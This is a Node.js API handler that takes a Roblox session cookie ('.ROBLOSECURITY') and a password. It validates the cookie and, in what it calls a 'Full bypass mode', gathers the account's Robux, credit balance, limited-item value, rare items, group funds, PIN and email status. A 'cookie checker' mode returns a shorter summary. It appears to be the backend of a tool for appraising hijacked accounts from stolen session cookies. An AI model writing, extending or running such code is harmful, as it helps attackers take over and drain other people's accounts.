const fetch = require('node-fetch');

async function robloxRequest(url, cookie = null, method = 'GET', body = null) {
    const headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json'
    };
    
    if (cookie) {
        headers['Cookie'] = `.ROBLOSECURITY=${cookie}`;
    }
    
    const options = { method, headers };
    if (body) {
        headers['Content-Type'] = 'application/json';
        options.body = JSON.stringify(body);
    }
    
    const response = await fetch(url, options);
    
    // Handle CSRF token
    if (response.status === 403) {
        const csrfToken = response.headers.get('x-csrf-token');
        if (csrfToken) {
            headers['X-CSRF-TOKEN'] = csrfToken;
            return await fetch(url, { method, headers, body: options.body });
        }
    }
    
    return response;
}

async function validateCookie(cookie) {
    try {
        const response = await robloxRequest('https://users.roblox.com/v1/users/authenticated', cookie);
        const userInfo = await response.json();
        if (userInfo && userInfo.id) return userInfo;
        return null;
    } catch {
        return null;
    }
}

async function getCreditBalance(cookie) {
    try {
        const response = await robloxRequest('https://billing.roblox.com/v1/credit', cookie);
        const data = await response.json();
        return data.balance || 0;
    } catch {
        return 0;
    }
}

async function getEmailSettings(cookie) {
    try {
        const response = await robloxRequest('https://accountsettings.roblox.com/v1/email', cookie);
        const data = await response.json();
        return {
            verified: data.verified || false,
            email: data.emailAddress || 'Not Set'
        };
    } catch {
        return { verified: false, email: 'Not Set' };
    }
}

async function getPinStatus(cookie) {
    try {
        const response = await robloxRequest('https://auth.roblox.com/v1/account/pin', cookie);
        return response.status === 200;
    } catch {
        return false;
    }
}

async function getPresenceType(userId) {
    try {
        const response = await fetch(`https://presence.roblox.com/v1/presence/users`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ userIds: [userId] })
        });
        const data = await response.json();
        if (data.userPresences && data.userPresences[0]) {
            const presence = data.userPresences[0];
            return presence.userPresenceType === 0 ? 'Offline' : 
                   presence.userPresenceType === 1 ? 'Online' : 
                   presence.userPresenceType === 2 ? 'In Game' : 'In Studio';
        }
        return 'Unknown';
    } catch {
        return 'Unknown';
    }
}

async function getGameData(userId) {
    try {
        // Get user's recently played games
        const response = await fetch(`https://games.roblox.com/v2/users/${userId}/games?limit=50&sortOrder=Desc`);
        const data = await response.json();
        
        const games = {
            BF: '❌',
            AM: '❌',
            MM2: '❌',
            PS99: '❌',
            BB: '❌'
        };
        
        const gamePasses = {
            BF: '❌',
            AM: '❌',
            MM2: '❌',
            PS99: '❌',
            BB: '❌'
        };
        
        // Check if user has played specific games (you can add game IDs here)
        // For now, return default values
        
        return { games, gamePasses };
    } catch {
        return {
            games: { BF: '❌', AM: '❌', MM2: '❌', PS99: '❌', BB: '❌' },
            gamePasses: { BF: '❌', AM: '❌', MM2: '❌', PS99: '❌', BB: '❌' }
        };
    }
}

module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, error: 'Method not allowed' });
    }

    const { cookie, password, checkOnly } = req.body;

    if (!cookie) {
        return res.status(400).json({ success: false, error: 'Cookie is required' });
    }

    try {
        const userInfo = await validateCookie(cookie);
        if (!userInfo) {
            return res.status(400).json({ success: false, error: 'Invalid or expired cookie' });
        }

        const userId = userInfo.id;
        const username = userInfo.name;
        const displayName = userInfo.displayName;

        // If checkOnly mode (for cookie checker page)
        if (checkOnly) {
            try {
                const [avatarRes, robuxRes, collectiblesRes, userDetailsRes] = await Promise.all([
                    fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png`),
                    robloxRequest(`https://economy.roblox.com/v1/users/${userId}/currency`, cookie),
                    fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100&sortOrder=Desc`),
                    fetch(`https://users.roblox.com/v1/users/${userId}`)
                ]);

                const avatarData = await avatarRes.json();
                const robuxData = await robuxRes.json();
                const collectiblesData = await collectiblesRes.json();
                const userDetails = await userDetailsRes.json();

                const avatarUrl = avatarData.data?.[0]?.imageUrl || '';
                const robux = robuxData.robux || 0;
                
                let rap = 0;
                if (collectiblesData.data) {
                    collectiblesData.data.forEach(item => {
                        if (item.recentAveragePrice) rap += item.recentAveragePrice;
                    });
                }

                const hasHeadless = collectiblesData.data?.some(i => i.assetId === 31117192);
                const hasKorblox = collectiblesData.data?.some(i => i.assetId === 139607718);

                const created = new Date(userDetails.created);
                const accountAgeDays = Math.floor((Date.now() - created) / (1000 * 60 * 60 * 24));

                return res.status(200).json({
                    success: true,
                    valid: true,
                    userId,
                    username,
                    displayName,
                    avatarUrl,
                    robux,
                    pendingRobux: 0,
                    rap,
                    accountAge: `${accountAgeDays} Days`,
                    pinEnabled: 'NO',
                    voiceChat: 'NO',
                    emailVerified: userDetails.hasVerifiedBadge ? 'YES' : 'NO',
                    headless: hasHeadless ? 'YES' : 'NO',
                    korblox: hasKorblox ? 'YES' : 'NO',
                    groupsOwned: 0,
                    credit: '$0'
                });
            } catch {
                return res.status(200).json({
                    success: true,
                    valid: true,
                    userId,
                    username,
                    displayName,
                    avatarUrl: '',
                    robux: 0,
                    pendingRobux: 0,
                    rap: 0,
                    accountAge: '0 Days',
                    pinEnabled: 'NO',
                    voiceChat: 'NO',
                    emailVerified: 'NO',
                    headless: 'NO',
                    korblox: 'NO',
                    groupsOwned: 0,
                    credit: '$0'
                });
            }
        }

        // Full bypass mode - fetch all data
        const [
            avatarData,
            robuxData,
            premiumData,
            collectiblesData,
            groupsData,
            userDetails,
            friendsData,
            followersData,
            creditBalance,
            emailSettings,
            pinEnabled,
            presenceType,
            gameData
        ] = await Promise.all([
            fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`).then(r => r.json()),
            robloxRequest(`https://economy.roblox.com/v1/users/${userId}/currency`, cookie).then(r => r.json()),
            fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`).then(r => r.json()).catch(() => null),
            fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`).then(r => r.json()),
            fetch(`https://groups.roblox.com/v1/users/${userId}/groups/roles`).then(r => r.json()),
            fetch(`https://users.roblox.com/v1/users/${userId}`).then(r => r.json()),
            fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`).then(r => r.json()),
            fetch(`https://friends.roblox.com/v1/users/${userId}/followers/count`).then(r => r.json()),
            getCreditBalance(cookie),
            getEmailSettings(cookie),
            getPinStatus(cookie),
            getPresenceType(userId),
            getGameData(userId)
        ]);

        const avatarUrl = avatarData.data?.[0]?.imageUrl || '';
        const robux = robuxData.robux || 0;
        const isPremium = premiumData !== null;

        // Calculate RAP and limiteds
        let rap = 0;
        let limitedCount = 0;
        if (collectiblesData.data) {
            collectiblesData.data.forEach(item => {
                if (item.recentAveragePrice) {
                    rap += item.recentAveragePrice;
                    limitedCount++;
                }
            });
        }

        // Check for special items
        const hasHeadless = collectiblesData.data?.some(i => i.assetId === 31117192);
        const hasKorblox = collectiblesData.data?.some(i => i.assetId === 139607718);

        // Groups info
        const ownedGroups = groupsData.data?.filter(g => g.role.rank === 255) || [];
        let totalGroupFunds = 0;
        let highestRank = 0;
        let highestGroup = 'None';

        // Get highest rank
        if (groupsData.data && groupsData.data.length > 0) {
            groupsData.data.forEach(g => {
                if (g.role.rank > highestRank) {
                    highestRank = g.role.rank;
                    highestGroup = g.group.name;
                }
            });
        }

        for (const group of ownedGroups.slice(0, 10)) {
            try {
                const fundsRes = await robloxRequest(`https://economy.roblox.com/v1/groups/${group.group.id}/currency`, cookie);
                const fundsData = await fundsRes.json();
                totalGroupFunds += fundsData.robux || 0;
            } catch {}
        }

        // Account age
        const created = new Date(userDetails.created);
        const accountAgeDays = Math.floor((Date.now() - created) / (1000 * 60 * 60 * 24));
        const joinDate = created.toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' });

        // Get bio
        const bio = userDetails.description || 'No bio';

        // Friends and followers
        const friendsCount = friendsData.count || 0;
        const followersCount = followersData.count || 0;

        // Build detailed info
        const detailedInfo = {
            userId,
            username,
            displayName,
            avatarUrl,
            
            // About
            accountAge: `${accountAgeDays} Days`,
            joinDate,
            bio: bio.substring(0, 50),
            
            // Information
            robux,
            pendingRobux: 0,
            creditBalance: `$${creditBalance}`,
            summary: `${robux} R$ | ${rap} RAP`,
            
            // Settings
            pinStatus: pinEnabled ? '✅ Enabled' : '❌ Disabled',
            isPremium,
            vcStatus: '❌ Disabled',
            emailVerified: emailSettings.verified ? '✅ Verified' : '❌ Not Verified',
            presenceType,
            
            // Games
            games: gameData.games,
            gamePasses: gameData.gamePasses,
            
            // Inventory
            rap,
            headlessStatus: hasHeadless ? '✅ True' : '❌ False',
            korbloxStatus: hasKorblox ? '✅ True' : '❌ False',
            
            // Groups
            totalGroupsOwned: ownedGroups.length,
            highestRank: highestRank || 0,
            highestGroup: highestGroup || 'None',
            totalGroupFunds,
            totalPendingGroupFunds: 0,
            
            // Profile
            friendsCount,
            followersCount
        };

        return res.status(200).json({
            success: true,
            userInfo: {
                userId,
                username,
                displayName,
                robux,
                rap,
                premium: isPremium ? '✅ True' : '❌ False',
                voiceChat: '❌ Disabled'
            },
            avatarUrl,
            detailedInfo
        });

    } catch (error) {
        console.error('Error:', error);
        return res.status(500).json({ success: false, error: 'Internal server error' });
    }
};
